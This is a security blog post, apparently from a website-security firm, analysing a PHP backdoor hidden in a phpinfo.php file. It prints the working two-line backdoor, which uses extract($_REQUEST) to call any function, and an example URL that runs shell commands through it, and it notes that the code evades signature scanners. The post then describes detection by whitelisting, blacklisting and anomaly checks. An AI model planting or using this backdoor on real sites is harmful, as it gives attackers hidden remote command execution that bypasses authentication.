@@ -1,0 +1,45 @@
+PHP Backdoors: Hidden With Clever Use of Extract Function
+
+When a site gets compromised, one thing we know for sure is that attackers love to leave malware that allows them access back into the site; this type of malware is called a backdoor. This type of malware was named this because it allows for remote control of a compromised website in a way that bypasses appropriate authentication methods. You can update your site, change passwords, along with any of your admin procedures, and the backdoor would still be there allowing unexpected access to an attacker.
+Backdoors are also very hard to find because they don’t have to be linked directly in the website, they can be very small and be easily confused with “normal” code. Some of them have passwords, some are heavily encrypted/encoded and can be anywhere on your site, file system or database.
+We have written extensively about website backdoors (generally in PHP) that allow for continuous reinfections and control of hacked websites.
+You can read something more about backdoors on these links:
+
+Ask Sucuri: What About the Backdoors?
+Ask Sucuri: Non-alphanumeric Backdoors
+Hiding Backdoors Using Cron
+
+If you search for “backdoor” on our blog here, you will find dozens of posts specifically around the subject.
+PHP Extract Backdoor
+As you can imagine, backdoors are something that get us very interested, and are a big part of our research. If we clean up a site and we miss just one backdoor, it means the site can get reinfected.
+Recently while working on a client website, one of our security analysts, Ben Martin, found a very interesting backdoor that leverages the extract PHP function. The backdoor was hidden on a file called phpinfo.php:
+
+@extract ($_REQUEST);
+@die ($ctime($atime));
+
+As you can see, it doesn’t look very suspicious. It doesn’t have any “eval” , “exec”, “system”, “assert” “preg_replace” (with /e/) or any other common function that allows for code execution. This makes most signature based malware detection and removal solutions useless. They won’t find anything.
+How can someone execute code by just leveraging extract, you may ask? If you look at the extract manual page, it explains what it does:
+
+extract — Import variables into the current symbol table from an array
+
+Basically it takes whatever array entries you have and creates variables for them. You may be thinking that doesn’t look too bad or dangerous, but when you look at this piece of code, it certainly is:
+
+@extract ($_REQUEST);
+
+It is extracting any content sent via GET or POST requests and creating variables for them. That means that in the next part of the code, where it executes “die” (exit) on $ctime($atime), it is actually executing whatever the attacker sends as “ctime” with “atime” as an argument.
+Running Commands Via The Backdoor
+Let me give an example that may make it a bit easier to follow. Let’s say I am a bad guy and I want to execute ls -la to list all contents of a directory on a site I just hacked so I can upload this backdoor. All I needed to do is visit this URL using any browser:
+
+site.com/phpinfo.php?ctime=system&atime=ls -la
+
+The extract function would take these variables and turn @die ($ctime($atime)); into @die (system(“ls -la”));. See now how powerful it is?
+Now you can take ls and turn into a cat, or echo, and many other commands to modify files. It is basically a full shell in there.
+Protecting and Detecting Backdoors
+As you can see, finding them is very hard. But these are some techniques that work very well:
+
+Whitelisting – We know what the good files look like. We have a large checksum set of all the core files used in WordPress, Joomla, osCommerce, Wiki, etc, etc s. We also have checksums for the most popular plugins, modules, extensions and themes. Do you know what that gives us? It gives us a verification method of the core files. It gives us a way to determine if they were modified, new files added, and we can safely validate the good ones.
+Blacklisting – We also have a list with thousands of backdoors and their variations that we have collected over the last few years.
+Anomaly Checks. When a file is not in our whitelist (core files), and not in our blacklist, we do our anomaly checks. These checks are where all the functions/variables in a file are analyzed and manually inspected to see if they are a backdoor. If it is, we modify our blacklists to catch them in the future. If not, it’s another file added to our whitelist.
+
+As you can see, we use more then one method to detect and protect by mixing whitelisting + blacklisting, and our own manual analysis to find all the backdoors on a site. If you are trying to clean a compromised site by yourself, we recommend first overwriting all the files you can (core files, plugins, etc). Of what is left, you have to manually analyze all the files to make sure they are clean.
+What do you think? We would love to hear your ideas or methods for checking for backdoors.
